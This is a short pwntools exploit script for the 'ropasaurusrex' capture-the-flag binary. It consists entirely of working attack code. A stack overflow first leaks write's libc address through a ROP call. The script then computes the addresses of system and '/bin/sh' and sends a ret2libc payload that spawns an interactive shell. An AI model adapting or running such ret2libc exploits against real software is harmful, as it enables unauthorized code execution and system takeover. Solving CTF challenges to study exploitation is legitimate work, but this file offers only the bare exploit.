from pwn import *

libc = ELF('libc.so.fuck')
elf = ELF('ropasaurusrex')

io = process('./ropasaurusrex')

plt_write = elf.symbols['write']
got_write = elf.got['write']
bof = 0x080483F4

payload1 = 'A' * 140 + p32(plt_write) + p32(bof) + p32(1) + p32(got_write) + p32(4)

print "\n#########sending payload1....#######"
io.send(payload1)

write_addr = u32(io.recv(4))
log.success('write_addr = ' + hex(write_addr))

libc_base = write_addr - libc.symbols['write']
log.success('libc_base= ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.success('system_addr= ' + hex(system_addr))
binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.success('binsh_addr= ' + hex(binsh_addr))


payload2 = 'A' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)

print "\n########sending payload2....########"
io.send(payload2)

io.interactive()
